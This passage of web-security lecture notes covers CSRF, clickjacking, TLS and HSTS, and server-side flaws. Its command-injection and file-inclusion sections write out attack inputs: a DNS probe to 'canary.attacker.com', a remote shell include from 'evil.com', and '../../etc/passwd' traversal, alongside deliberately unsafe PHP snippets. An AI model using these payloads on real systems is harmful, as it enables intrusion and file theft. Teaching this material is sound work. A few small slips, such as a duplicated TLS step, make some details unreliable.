<div class="outline-text-4" id="text-5-2-1">
<p>
Since the double submit pattern stores a secret token inside a cookie, the confidentiality of the cookie must be ensured:
</p>
<ul class="org-ul">
<li>Mark the cookie with the <b>Secure</b> attribute to prevent its disclosure;
</li>
<li>Perhaps surprisingly, notice that the <b>HttpOnly attribute does not
provide much help</b> here!
</li>
</ul>

<p>
<b>Secure implementation</b>: Alternatively, adopt the Secure- prefix to ensure
cookie integrity.
</p>
</div>
</div>
</div>
<div id="outline-container-sec-5-3" class="outline-3">
<h3 id="sec-5-3"><span class="section-number-3">5.3</span> SameSite Cookies</h3>
<div class="outline-text-3" id="text-5-3">
<p>
Cookies marked with the <b>SameSite attribute</b> can be configured so that they are
not attached to cross-site requests:
</p>
<ul class="org-ul">
<li><b>site = registrable domain</b> (e.g., google.com) and its subdomains;
</li>
<li><b>SameSite=Strict</b>: applies this policy to every HTTP request, thus
</li>
</ul>
<p>
offering high security, but with the risk of breaking web applications
</p>
<ul class="org-ul">
<li><b>SameSite=Lax</b>: relaxes this restriction in the case of top-level navigations
with a safe method, e.g., resulting from clicking a link
</li>
</ul>

<p>
This defense is simple and effective, but it does not offer protection to legacy
browsers, hence also more traditional defenses like tokens should be
implemented.
</p>
</div>
</div>
<div id="outline-container-sec-5-4" class="outline-3">
<h3 id="sec-5-4"><span class="section-number-3">5.4</span> Vulnerability: Login CSRF</h3>
<div class="outline-text-3" id="text-5-4">
<p>
If the login form of a web application is not protected against CSRF, the
attacker can force the victim into authenticating using the attacker’s account:
this attack is known as <b>login CSRF</b>.
</p>

<p>
<b>Defense</b>:
</p>
<ul class="org-ul">
<li><b>header checks</b> upon login form submission;
</li>
<li><b>secret tokens</b> in the login form: since login CSRF happens before the
authenticated session, you must setup a pre-session for the token (commonly
used);
</li>
<li><b>SameSite cookies</b>: just require the presence of a SameSite cookie upon login
form submission. This requires enforcing cookie integrity against network
attackers, otherwise the cookie could be forged
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-5-5" class="outline-3">
<h3 id="sec-5-5"><span class="section-number-3">5.5</span> CSRF prevention: summary</h3>
<div class="outline-text-3" id="text-5-5">
<ol class="org-ol">
<li>Checking the content of the Referer / Origin header or the mere
presence of custom headers might work, but this is often impractical;
</li>
<li>Secret tokens are better for most applications, but implementation is not
straightforward;
</li>
<li>SameSite cookies are a simple and elegant solution against CSRF, which solves
the issues of tokens, but only protects modern browsers and a part of the
state-changing requests.

<p>
<b>Best practice: SameSite cookies + secret tokens.</b>
</p>
</li>
</ol>
</div>
</div>
<div id="outline-container-sec-5-6" class="outline-3">
<h3 id="sec-5-6"><span class="section-number-3">5.6</span> XSS vs CSRF</h3>
<div class="outline-text-3" id="text-5-6">
<p>
Both XSS and CSRF are dangerous attacks. Notice that:
</p>
<ul class="org-ul">
<li>if a web application is vulnerable against XSS, none of the proposed defenses
against CSRF is effective, because <b>the attacker operates from a same-site
position</b>. This means that XSS is a more serious security concern than CSRF in
most cases.
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6"><span class="section-number-2">6</span> Frames Security</h2>
<div class="outline-text-2" id="text-6">
<p>
A frame is a part of a web page which <b>renders content independently of its
container</b>.
It is usually used for:
</p>
<ul class="org-ul">
<li><b>advertisement</b>: content served by an advertisement network is placed in a
separate area to generate revenue;
</li>
<li><b>authentication</b>: login form of a single sign-on provider is placed in a
separate area, which looks the same on all the including websites;
</li>
<li><b>gadgets</b>: “like” buttons and such
</li>
</ul>

<p>
The parent frame and its children keep <b>living in their own origins</b>.
</p>

<blockquote>
<p>
<b>Prevent framing</b>: The operators of good.com might want to forbid framing
 content from evil.com, for example because it displays inappropriate content:
 they can do this by using the <b>frame-src</b> directive of CSP.
</p>
</blockquote>

<blockquote>
<p>
<b>Prevent being framed</b>: The operators of good.com might want to forbid being
 framed from evil.com, for example to mitigate phishing attempts: they can do
 this by using the <b>X-Frame-Options</b> header or the <b>frame-ancestors</b> directive of
 CSP.
</p>
</blockquote>

<p>
Frames on the same origin can communicate by <b>reading and writing</b> over their
DOMs, since SOP does not isolate them.
</p>
</div>
<div id="outline-container-sec-6-1" class="outline-3">
<h3 id="sec-6-1"><span class="section-number-3">6.1</span> Domain relaxation</h3>
<div class="outline-text-3" id="text-6-1">
<p>
Frames on the same site can relax their document.domain property to get the same
origin and enable communication. \(p_{1}\) at <a href="https://www.foo.com">https://www.foo.com</a> loads \(p_{2}\) at
<a href="https://mail.foo.com">https://mail.foo.com</a> inside a frame, then the two frames can communicate as
follows:
</p>
<ol class="org-ol">
<li>\(p_{1}\) sets document.domain to foo.com;
</li>
<li>\(p_{2}\) sets document.domain to foo.com;
</li>
<li>\(p_{1}\) and \(p_{2}\) now have the same origin and can communicate.
</li>
</ol>

<p>
This can have security implications:
</p>
</div>
</div>
<div id="outline-container-sec-6-2" class="outline-3">
<h3 id="sec-6-2"><span class="section-number-3">6.2</span> postMessage</h3>
<div class="outline-text-3" id="text-6-2">
<p>
Frame communication between different origins is better implemented by means of
the postMessage API.
</p>

<div class="org-src-container">

<pre class="src src-javascript">targetWindow.postMessage(message, targetOrigin);
</pre>
</div>

<p>
Message reception:
</p>
<div class="org-src-container">

<pre class="src src-javascript">window.addEventListener(<span style="color: #b8bb26;">"message"</span>, receiveMessage);
</pre>
</div>
</div>
<div id="outline-container-sec-6-2-1" class="outline-4">
<h4 id="sec-6-2-1"><span class="section-number-4">6.2.1</span> postMessage: security considerations</h4>
<div class="outline-text-4" id="text-6-2-1">
<p>
postMessage is better than domain relaxation for frame communication, because it
is more general and exchanges serialized data <b>without granting scripting access</b>
to the frame.
</p>
</div>
</div>
</div>
<div id="outline-container-sec-6-3" class="outline-3">
<h3 id="sec-6-3"><span class="section-number-3">6.3</span> Frame sandboxing</h3>
<div class="outline-text-3" id="text-6-3">
<p>
It is possible to restrict the privileges of frames by setting the sandbox
attribute to the empty string. The most important restrictions are:
</p>
<ol class="org-ol">
<li>the content of the frame is treated as being from a <b>unique origin</b>, thus
enforcing frame isolation thanks to SOP;
</li>
<li><b>form submission</b> from the frame is blocked;
</li>
<li>all forms of <b>script execution</b> in the frame are blocked;
</li>
<li><b>plugin execution</b> in the frame is blocked;
</li>
<li><b>popup creation</b> from the frame is blocked;
</li>
<li><b>top-level navigation</b> via window.top.location is blocked.
</li>
</ol>

<p>
It is possible to relax individual security restrictions:
</p>

<table class="table table-striped table-bordered table-hover table-condensed">


<colgroup>
<col  class="left">

<col  class="left">
</colgroup>
<tbody>
<tr>
<td class="text-left"><b>Default Restriction</b></td>
<td class="text-left"><b>Relaxed with</b></td>
</tr>

<tr>
<td class="text-left">enforce unique origin</td>
<td class="text-left">allow-same-origin</td>
</tr>

<tr>
<td class="text-left">form submission is blocked</td>
<td class="text-left">allow-forms</td>
</tr>

<tr>
<td class="text-left">script execution is blocked</td>
<td class="text-left">allow-scripts</td>
</tr>

<tr>
<td class="text-left">popup creation is blocked</td>
<td class="text-left">allow-popups</td>
</tr>

<tr>
<td class="text-left">top-level navigation is blocked</td>
<td class="text-left">allow-top-navigation</td>
</tr>
</tbody>
</table>

<p>
<b>Example:</b>
</p>
<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #b8bb26;">iframe</span> <span style="color: #83a598;">src</span>=<span style="color: #b8bb26;">"https://platform.twitter.com/tweet_button.html"</span>
        <span style="color: #83a598;">sandbox</span>=<span style="color: #b8bb26;">"allow-same-origin allow-scripts</span>
<span style="color: #b8bb26;">                 allow-popups allow-forms"</span>/&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-6-4" class="outline-3">
<h3 id="sec-6-4"><span class="section-number-3">6.4</span> Clickjacking</h3>
<div class="outline-text-3" id="text-6-4">
<p>
Clickjacking is a UI-based attack in which a user is tricked into clicking on
actionable content on a target website by clicking on some other content in a
decoy website, operated by the attacker.
</p>

<p>
The attacker uses the opacity and z-index attributes of CSS to place a
transparent frame pointing to the target website on top of content of the decoy
website.
</p>

<p>
<b>Clickjacking is a great technique to bypass CSRF protection, because the request
comes from a same-site position!</b>
</p>
</div>
<div id="outline-container-sec-6-4-1" class="outline-4">
<h4 id="sec-6-4-1"><span class="section-number-4">6.4.1</span> Solutions against clickjacking: <b>X-Frame-Options</b></h4>
<div class="outline-text-4" id="text-6-4-1">
<p>
A better solution against clickjacking is based on the X-Frame-Options header
(XFO for short). It can take three possible values:
</p>
<ul class="org-ul">
<li><b>DENY</b>: page framing is denied;
</li>
<li><b>SAMEORIGIN</b>: page framing is only allowed on the same origin;
</li>
<li><b>ALLOW-FROM</b> \(u\): page framing is only allowed at \(u\)
</li>
</ul>

<p>
<b>Note that ALLOW-FROM is not supported by Chrome and derivates</b>.
</p>
</div>
<ol class="org-ol"><li><a id="sec-6-4-1-1" name="sec-6-4-1-1"></a>Problems with XFO<br ><div class="outline-text-5" id="text-6-4-1-1">
<blockquote>
<p>
<b>Limited Expressiveness</b>: XFO does not allow to express useful policies like:
</p>
<ul class="org-ul">
<li>framing is allowed on any origin from a whitelist
</li>
<li>framing is allowed on any subdomain of a given site
</li>
</ul>
</blockquote>

<blockquote>
<p>
<b>Incomplete Specification</b>: was implemented in browsers before being
 standardized, different browsers might give different interpretations to the
 same value.
</p>
</blockquote>
</div>
</li>
<li><a id="sec-6-4-1-2" name="sec-6-4-1-2"></a>Double Framing<br ><div class="outline-text-5" id="text-6-4-1-2">
<p>
The XFO specification does not mandate whether origin checks have to be
performed on the top-level browsing context or on the full chain of ancestors,
hence some browsers are subject to double framing attacks.
</p>

<p>
An attacker who exploits a markup injection at good.com can perform clickjacking
by abusing nested frames, unless the browser checks the full chain of frame
ancestors.
</p>

<p>
The <b>frame-ancestors</b> directive introduced in <b>CSP Level 2</b> is the best protection
mechanism against clickjacking on modern browsers:
</p>
<ul class="org-ul">
<li>it leverages the full expressive power of the source expressions of CSP;
</li>
<li>it solves the issue of double framing, since all ancestors are checked
</li>
<li>it overrides XFO in browsers supporting CSP Level 2
</li>
</ul>
</div>
</li></ol>
</div>
</div>
<div id="outline-container-sec-6-5" class="outline-3">
<h3 id="sec-6-5"><span class="section-number-3">6.5</span> CSP vs XFO</h3>
<div class="outline-text-3" id="text-6-5">
<blockquote>
<p>
A policy p is <b>security-oriented</b> if and only if:
</p>
<ul class="org-ul">
<li>\(p\) is consistent for the set of legacy browsers \(B_{l}\)
</li>
<li>\(p\) is consistent for the set of legacy browsers \(B_{m}\)
</li>
<li>for any \(b_{l}\) in \(B_{l}\) and \(b_{m}\) in \(B_{m}\), the security restrictions on \(b_{l}\) are no weaker than the security restrictions on \(b_{m}\)
</li>
</ul>
</blockquote>

<blockquote>
<p>
A policy p is <b>compatibility-oriented</b> if and only if:
</p>
<ul class="org-ul">
<li>\(p\) is consistent for the set of legacy browsers \(B_{l}\)
</li>
<li>\(p\) is consistent for the set of legacy browsers \(B_{m}\)
</li>
<li>for any \(b_{l}\) in \(B_{l}\) and \(b_{m}\) in \(B_{m}\), the security restrictions on \(b_{m}\) are no weaker than the security restrictions on \(b_{l}\)
</li>
</ul>
</blockquote>
</div>
</div>
<div id="outline-container-sec-6-6" class="outline-3">
<h3 id="sec-6-6"><span class="section-number-3">6.6</span> SameSite Cookies and Clickjacking</h3>
<div class="outline-text-3" id="text-6-6">
<p>
<b>Cookies with the SameSite attribute (Strict or Lax) are not included in requests
sent from a frame embedded in a cross-site position</b>:
</p>
<ul class="org-ul">
<li>effective against most clickjacking attempts, i.e., those abusing
authentication to achieve <b>effects similar to CSRF</b>;
</li>
<li><b>legacy browsers do not support the SameSite attribute</b>, so this can only be
part of a defense-in-depth strategy (use XFO and CSP);
</li>
<li>web applications implementing authentication without using cookies, e.g., on
top of the web storage, must still rely on <b>XFO and CSP to prevent clickjacking</b>
attempts.
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7"><span class="section-number-2">7</span> HTTP &amp; TLS</h2>
<div class="outline-text-2" id="text-7">
<p>
HTTPS is the <b>encrypted variant</b> of HTTP:
</p>
<ul class="org-ul">
<li>HTTPS = HTTP on top of a cryptographic protocol (SSL / TLS);
</li>
<li>HTTPS provides confidentiality, integrity and server authentication
</li>
<li>support for client authentication, yet basically unused in practice
</li>
</ul>
</div>
<div id="outline-container-sec-7-1" class="outline-3">
<h3 id="sec-7-1"><span class="section-number-3">7.1</span> TLS</h3>
<div class="outline-text-3" id="text-7-1">
<ul class="org-ul">
<li><b>asymmetric cryptography</b>: used to establish a symmetric key, called the session
key, between the client and the server;
</li>
<li><b>symmetric cryptography</b>: used to ensure the confidentiality and the integrity
of the exchanged messages by means of the session key;
</li>
<li><b>certificates</b>: used to provide authentication by binding the public key of the
server to its identity. This is done thanks to a signature issued by a trusted
Certification Authority (CA).
</li>
</ul>
</div>
<div id="outline-container-sec-7-1-1" class="outline-4">
<h4 id="sec-7-1-1"><span class="section-number-4">7.1.1</span> TLS Flow</h4>
<div class="outline-text-4" id="text-7-1-1">
<ol class="org-ol">
<li>The client initiates a <b>handshake</b> with the server by proposing a TLS version
and a list of supported cipher suites (crypto algorithms);
</li>
<li>The server chooses the lower between its highest supported <b>TLS version</b> and
the TLS version proposed by the client. It then picks a supported <b>cipher</b>
suite from the proposed list and <b>sends its certificate</b>;
</li>
<li>The client confirms the validity of the certificate and retrieves the
<b>server’s public key</b> from it;
</li>
<li>The client confirms the <b>validity of the certificate</b> and retrieves the
server’s public key from it;
</li>
<li>The client and the server take appropriate actions to generate the <b>session
key</b>, taking advantage of the server’s public key;
</li>
<li>The session key is used to <b>protect the communication</b>.
</li>
</ol>
</div>
</div>
<div id="outline-container-sec-7-1-2" class="outline-4">
<h4 id="sec-7-1-2"><span class="section-number-4">7.1.2</span> Session key establishment: RSA</h4>
<div class="outline-text-4" id="text-7-1-2">
<ol class="org-ol">
<li>the client generates a random number s;
</li>
<li>the client sends s to the server, encrypted with the server’s pub key;
</li>
<li>the server decrypts s using its private key;
</li>
<li>the client and the server generate the session key k from s, using a key
derivation algorithm.
</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-sec-7-2" class="outline-3">
<h3 id="sec-7-2"><span class="section-number-3">7.2</span> Protocol downgrade attacks</h3>
<div class="outline-text-3" id="text-7-2">
<p>
Downgrade attacks are often implemented as part of a MITM attack and may be used
as a way of enabling a cryptographic attack that might not be possible
otherwise:
</p>
<ol class="org-ol">
<li>The <b>client initiates a handshake</b> with the server by proposing a TLS version
and a list of supported cipher suites;
</li>
<li>The <b>attacker intercepts and modifies the original message</b>, so that it
contains insecure protocol versions such as TLS 1.0 and SSL 3.0;
</li>
<li>The <b>server chooses the lower</b> between its highest supported <b>TLS version</b> and
the TLS version proposed by the client. It then picks a supported cipher
suite from the proposed list and sends its certificate;
</li>
<li>If the attack is successful, <b>an insecure protocol or cipher suite is used</b>
</li>
</ol>

<p>
<b>Mitigation techniques</b>:
</p>
<ul class="org-ul">
<li>Disable server-side support for legacy protocols and insecure cipher suites.
This might require fixes to other servers using the same certificate, i.e.,
using the same private key;
</li>
<li>Use TLS 1.3: native protection against downgrade attacks. It is a major
overhaul of TLS 1.2, despite the small change to the version number
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-7-3" class="outline-3">
<h3 id="sec-7-3"><span class="section-number-3">7.3</span> Heartbleed</h3>
<div class="outline-text-3" id="text-7-3">
<p>
Some attacks against TLS are not enabled by the protocol design, but rather by
its implementation! A famous example is the Heartbleed attack against OpenSSL.
</p>

<p>
Simple fix: <b>update the OpenSSL version</b> or at the very least disable the
Heartbeat extension upon compilation.
</p>
</div>
</div>
<div id="outline-container-sec-7-4" class="outline-3">
<h3 id="sec-7-4"><span class="section-number-3">7.4</span> Certificates</h3>
<div class="outline-text-3" id="text-7-4">
<p>
A certificate is a <b>cryptographic proof of the ownership of a public key</b>. It
contains several fields, including:
</p>
<ol class="org-ol">
<li>Serial Number: used to handle certificate revocation;
</li>
<li>Subject: the owner of the public key, i.e., the server’s identity;
</li>
<li>Public Key: the public key of the subject;
</li>
<li>Issuer: the entity who created the certificate;
</li>
<li>Validity: the validity period of the certificate;
</li>
<li>Signature: a signature of the certificate body with the issuer’s private key;
</li>
</ol>

<blockquote>
<p>
A <b>certificate chain</b> is a list of certificates such that:
</p>
<ol class="org-ol">
<li>the Issuer of each certificate (except the last one) matches the Subject of
the next certificate in the list;
</li>
<li>each certificate (except the last one) can be verified using the public key
contained in the next certificate in the list;
</li>
<li>the last certificate is a trust anchor, i.e., a self-signed certificate that
one trusts because it was issued by a trusted certification authority.
</li>
</ol>
</blockquote>
</div>
<div id="outline-container-sec-7-4-1" class="outline-4">
<h4 id="sec-7-4-1"><span class="section-number-4">7.4.1</span> Types of certificates</h4>
<div class="outline-text-4" id="text-7-4-1">
<p>
Certificates can have three different <b>validation levels</b>:
</p>
<ol class="org-ol">
<li><b>Domain Validation</b>: bind a public key to a domain name, i.e., they are issued
after showing the right to manage a domain name;
</li>
<li><b>Organization Validation</b>: bind a public key to an organization, i.e., they
additionally require a proof of existence as a legal entity;
</li>
<li><b>Extended Validation</b>: similar to Organization Validation, but with even
stricter rules aimed at assessing the legitimacy of the company.
</li>
</ol>
</div>
</div>
<div id="outline-container-sec-7-4-2" class="outline-4">
<h4 id="sec-7-4-2"><span class="section-number-4">7.4.2</span> Scope of certificates</h4>
<div class="outline-text-4" id="text-7-4-2">
<ol class="org-ol">
<li><b>Single domain</b>: valid for a domain name and the www sub-domain;
</li>
<li><b>Multiple domains</b>: valid for an arbitrary list of domain names, set in the
Subject Alternative Name field of the certificate;
</li>
<li><b>Arbitrary sub-domains</b>: valid for a domain name and all its first-level
sub-domains, e.g., *.example.com.
</li>
</ol>

<p>
The scope of certificates is important:
</p>
<ul class="org-ul">
<li>if two machines share the same certificate, they also share the same public
and private keys!
</li>
<li>once a machine is compromised and its private key is leaked, the attacker can
impersonate all the other machines sharing the same certificate and possibly
inspect traffic exchanged with them;
</li>
<li>certificate reuse increases the attack surface against web apps.
</li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8"><span class="section-number-2">8</span> More HTTPS</h2>
<div class="outline-text-2" id="text-8">
</div><div id="outline-container-sec-8-1" class="outline-3">
<h3 id="sec-8-1"><span class="section-number-3">8.1</span> Mixed Content Policy</h3>
<div class="outline-text-3" id="text-8-1">
<p>
The Mixed Content policy recommends defensive techniques to mitigate the dangers
of insecurely-loaded sub-resources.
</p>
<ul class="org-ul">
<li><b>passive content</b> like images, audios and videos: optionally blockable, i.e.,
might be blocked or not at the discretion of browser vendors;
</li>
<li><b>active content</b>, i.e., the rest: must always be blocked.
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-8-2" class="outline-3">
<h3 id="sec-8-2"><span class="section-number-3">8.2</span> CSP to TLS enforcement</h3>
<div class="outline-text-3" id="text-8-2">
<p>
CSP provides support to simplify a full transition from HTTP to HTTPS:
</p>
<ol class="org-ol">
<li><b>upgrade-insecure-requests</b>: all the HTTP requests sent from the web page are
automatically upgraded to HTTPS before they are sent on the network. This is
useful to enforce HTTPS upgrade also for blockable content;
</li>
<li><b>block-all-mixed-content</b> (now obsoleted): tells the browser that all types of
mixed content must be blocked. Ignored in modern browsers, because
upgradeable content is automatically loaded using HTTPS and blockable content
is already blocked
</li>
</ol>
</div>
</div>
<div id="outline-container-sec-8-3" class="outline-3">
<h3 id="sec-8-3"><span class="section-number-3">8.3</span> HTTP Strict Transport Security (HSTS)</h3>
<div class="outline-text-3" id="text-8-3">
<p>
HSTS is a security policy which can be used to prevent SSL stripping:
</p>
<ul class="org-ul">
<li>HSTS instructs the browser that the server only wants to accept HTTPS
connections for a given duration;
</li>
<li>The browser must upgrade all the HTTP requests to the server over HTTPS before
they are sent on the network
</li>
<li>If the security of the HTTPS connection cannot be established, e.g., invalid
TLS certificate, the browser must stop the connection.
</li>
</ul>

<p>
<b>Strict-Transport-Security: max-age=31536000</b>
</p>

<p>
HSTS headers must be honored by the browser only when they are served over HTTPS.
</p>
</div>
<div id="outline-container-sec-8-3-1" class="outline-4">
<h4 id="sec-8-3-1"><span class="section-number-4">8.3.1</span> HSTS and cookie security</h4>
<div class="outline-text-4" id="text-8-3-1">
<blockquote>
<p>
<b>Cookie confidentiality</b>: Cookies with the Domain attribute can inadvertently be
 shared with HTTP sub-domains. Communication with such domains can be forced by
 network attackers.
</p>
</blockquote>


<blockquote>
<p>
<b>Cookie integrity</b>: Network attackers can abuse HTTP traffic from sub-domains to
 forge cookies with the Domain attribute, which may be eventually sent to the
 target host.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-8-3-2" class="outline-4">
<h4 id="sec-8-3-2"><span class="section-number-4">8.3.2</span> includeSubDomains option</h4>
<div class="outline-text-4" id="text-8-3-2">
<p>
HSTS can be activated with the <b>includeSubDomains</b> option to extend the HTTPS
upgrade to sub-domains as well.
</p>

<blockquote>
<p>
<b>Cookie confidentiality</b>: Since sub-domains cannot be contacted over HTTP, even
 domain cookies are guaranteed to always be sent over HTTPS.
</p>
</blockquote>

<blockquote>
<p>
<b>Cookie integrity</b>: Since sub-domains cannot be contacted over HTTP, network
 attackers cannot forge HTTP traffic to set domain cookies.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-8-3-3" class="outline-4">
<h4 id="sec-8-3-3"><span class="section-number-4">8.3.3</span> HSTS Preload list</h4>
<div class="outline-text-4" id="text-8-3-3">
<p>
To simplify HSTS deployment, site operators can ask for inclusion in the HSTS
preload list, i.e., a <b>list of known HSTS domains that browsers will honor</b>.
Connections to such domains are subject to strong HSTS policies.
</p>

<blockquote>
<p>
<b>Requirements</b>:
</p>
<ul class="org-ul">
<li>Serve a valid certificate;
</li>
<li>Redirect from HTTP to HTTPS on the same host;
</li>
<li>Serve all sub-domains over HTTPS;
</li>
<li>Serve an HSTS header on the base domain for HTTPS requests, with max-age set
to at least 1 year and includeSubDomains;
</li>
<li>The HSTS policy must include the preload option.
</li>
</ul>
</blockquote>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-9" class="outline-2">
<h2 id="sec-9"><span class="section-number-2">9</span> Server-side security</h2>
<div class="outline-text-2" id="text-9">
</div><div id="outline-container-sec-9-1" class="outline-3">
<h3 id="sec-9-1"><span class="section-number-3">9.1</span> Path traversal</h3>
<div class="outline-text-3" id="text-9-1">
<p>
Path traversal is a well-known web security vulnerability which allows the
attacker to <b>read arbitrary files from the web server</b>.
</p>

<p>
Path traversal is typically presented as an attack against confidentiality, but
it can also be used to break integrity: <b>By uploading a file with name
../index.php</b>, the attacker might be able to take full control of the web
application logic!
</p>
</div>
<div id="outline-container-sec-9-1-1" class="outline-4">
<h4 id="sec-9-1-1"><span class="section-number-4">9.1.1</span> Protecting against path traversal</h4>
<div class="outline-text-4" id="text-9-1-1">
<p>
Like for most injection vulnerabilities, the most important rule to keep in mind
against path traversal is: don’t do it by yourself!
</p>
<ul class="org-ul">
<li>use an existing API to <b>canonicalize the filename</b>, i.e., to uniquely resolve it
into an absolute path
</li>
<li>perform the security checks over the canonicalized filename, e.g., <b>check that
it starts with the expected base directory</b>
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-9-2" class="outline-3">
<h3 id="sec-9-2"><span class="section-number-3">9.2</span> Command injection</h3>
<div class="outline-text-3" id="text-9-2">
<p>
Command injection is an infamous web security vulnerability which allows the
attacker to execute <b>arbitrary OS commands on the server</b>.
</p>

<p>
Since command injection leverages a call to an OS command, most of the times the
attacker is forced to <b>play blind</b>. In particular, the following side-channels are
useful to identify room for command injection:
</p>
<ol class="org-ol">
<li><b>time delays</b>, e.g., ping -c 10 127.0.0.1
</li>
<li><b>output redirection</b>, e.g., whoami &gt; /var/www/static/whoami.txt
</li>
<li><b>DNS resolution</b>, e.g., nslookup canary.attacker.com
</li>
</ol>
</div>
<div id="outline-container-sec-9-2-1" class="outline-4">
<h4 id="sec-9-2-1"><span class="section-number-4">9.2.1</span> Preventing Command injection</h4>
<div class="outline-text-4" id="text-9-2-1">
<p>
The best way to defend against command injection is to avoid calls to external
OS commands:
</p>
<ul class="org-ul">
<li>Most of the times, you can use <b>application-level libraries</b> for the same task:
this is generally more secure;
</li>
<li>If this is not possible, <b>sanitize your input by using existing libraries</b>,
e.g., shlex.quote in Python escapes shell metacharacters;
</li>
<li><b>Separate commands from parameters by using the APIs</b> of your programming
language, e.g., subprocess.run in Python
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-9-3" class="outline-3">
<h3 id="sec-9-3"><span class="section-number-3">9.3</span> Templates</h3>
<div class="outline-text-3" id="text-9-3">
<p>
Server-side programming languages often use templates: Templates might suffer
from <b>XSS vulnerabilities</b>, though web frameworks often provide auto-escaping
features.
</p>

<p>
If the attacker is able to provide inputs which get rendered as a template, the
application suffers from a server-side template injection vulnerability.
</p>

<p>
Unsafe example: rendering a welcome message from a custom template
</p>
<div class="org-src-container">

<pre class="src src-php">$output = $twig-&gt;render($_GET[’custom_message’],
              array("first_name" =&gt; $user.first_name) );
</pre>
</div>
</div>
</div>
<div id="outline-container-sec-9-4" class="outline-3">
<h3 id="sec-9-4"><span class="section-number-3">9.4</span> Insecure deserialization</h3>
<div class="outline-text-3" id="text-9-4">
<blockquote>
<p>
<b>Serialization</b>: The process of converting complex data structures into a “flat”
 format, amenable for network communication or storage.
</p>
</blockquote>

<p>
Deserialization turns a serialized object back into its original state:
</p>
<ul class="org-ul">
<li>dangerous when this involves <b>user-controlled</b> data
</li>
<li>damage can be done even before deserialization is finished, e.g., exceptions
leading to DoS or abuse of magic methods like wakeup
</li>
<li>weakly typed programming languages are particularly at risk, yet strong typing
only mitigates the issue
</li>
</ul>
</div>
<div id="outline-container-sec-9-4-1" class="outline-4">
<h4 id="sec-9-4-1"><span class="section-number-4">9.4.1</span> Example</h4>
<div class="outline-text-4" id="text-9-4-1">
<div class="org-src-container">

<pre class="src src-php">$login = unserialize($_COOKIE["auth"])
if ($login[’password’] == $password) {
  // log in successfully
}
</pre>
</div>

<p>
This allows authentication bypasses, due to subtle ingredients:
</p>
<ul class="org-ul">
<li>the loose comparison operator == can equate two elements with different types
</li>
<li>we have 0 == &ldquo;Any string not starting with numbers&rdquo;
</li>
<li>this only works when the serialized object contains 0 as integer, not
</li>
</ul>
<p>
as string
</p>
</div>
</div>
<div id="outline-container-sec-9-4-2" class="outline-4">
<h4 id="sec-9-4-2"><span class="section-number-4">9.4.2</span> Impact and defenses</h4>
<div class="outline-text-4" id="text-9-4-2">
<p>
Insecure deserialization may have dangerous consequences:
</p>
<ol class="org-ol">
<li>remote code execution;
</li>
<li>privilege escalation and authentication bypasses
</li>
<li>denial of service
</li>
<li>data-only attacks
</li>
</ol>

<p>
To prevent insecure deserialization:
</p>
<ul class="org-ul">
<li><b>do not serialize user-controlled data</b>!
</li>
<li>if you really need to do that, sign the serialized data and <b>check their
integrity</b> before attempting deserialization
</li>
<li>do not serialize objects: use pure data format like <b>JSON</b>
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-9-5" class="outline-3">
<h3 id="sec-9-5"><span class="section-number-3">9.5</span> File inclusion</h3>
<div class="outline-text-3" id="text-9-5">
<p>
A file inclusion vulnerability happens when a web application includes
server-side code without appropriate sanitization. We will discuss this in the
context of PHP, but other languages like JSP are also vulnerable.
</p>

<pre class="example">
https://foo.com/index.php?page=contacts.php
</pre>

<p>
Malicious usages:
</p>
<ul class="org-ul">
<li>Denial of service: ?page=index.php
</li>
<li>Remote file inclusion: ?page=<a href="https://evil.com/shell.php">https://evil.com/shell.php</a>
</li>
<li>Local file inclusion: ?page=/uploads/shell.php
</li>
<li>Data exfiltration: ?page=../../etc/passwd
</li>
</ul>
</div>
<div id="outline-container-sec-9-5-1" class="outline-4">
<h4 id="sec-9-5-1"><span class="section-number-4">9.5.1</span> Preventing File Inclusion Vulnerabilities</h4>
<div class="outline-text-4" id="text-9-5-1">
<p>
The best solution against file inclusion vulnerabilities is to use a whitelist
of allowed resources for inclusion.
</p>
</div>
</div>
</div>
<div id="outline-container-sec-9-6" class="outline-3">
<h3 id="sec-9-6"><span class="section-number-3">9.6</span> Unrestricted File Upload</h3>
<div class="outline-text-3" id="text-9-6">
<p>
Uploaded files represent a significant risk to web apps: after uploading code,
the attacker only needs to find a way to get it executed.
</p>

<p>
It might be surprising to realize that many files are dangerous:
</p>
<ul class="org-ul">
<li>HTML: enabler for persistent XSS
</li>
<li>SVG: supports inline JavaScript
</li>
</ul>
</div>
<div id="outline-container-sec-9-6-1" class="outline-4">
<h4 id="sec-9-6-1"><span class="section-number-4">9.6.1</span> Preventing UFU</h4>
<div class="outline-text-4" id="text-9-6-1">
<p>
Unrestricted file upload is complicated to deal with, hence also difficult to
detect automatically:
</p>
<ol class="org-ol">
<li>sanitize the content of the filename (for application integrity)
</li>
<li>file extensions cannot be trusted, but white-listing them is useful because
some programs require specific extensions to operate
</li>
<li>check / sanitize / re-encode the content of the uploaded files
</li>
<li>restrict upload operations to authenticated users
</li>
<li>put the uploaded files out of the webroot / on an external domain, so that
SOP can provide protection
</li>
<li>put a limit on the file size to avoid denial of service.
</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-sec-9-7" class="outline-3">
<h3 id="sec-9-7"><span class="section-number-3">9.7</span> Server-side request forgery</h3>
<div class="outline-text-3" id="text-9-7">
<p>
SSRF is a vulnerability forcing a web application back-end into sending HTTP
requests to a target host of the attacker’s choosing:
</p>
<ul class="org-ul">
<li>typical targets: the local host or other back-end servers sitting on the same
local network, protected by a firewall
</li>
</ul>

<p>
Why do we need server-side requests in web applications?
<b>Data import</b>, <b>Previews</b>, <b>Chaching</b>.
</p>

<p>
SSRF can also be abused to:
</p>
<ol class="org-ol">
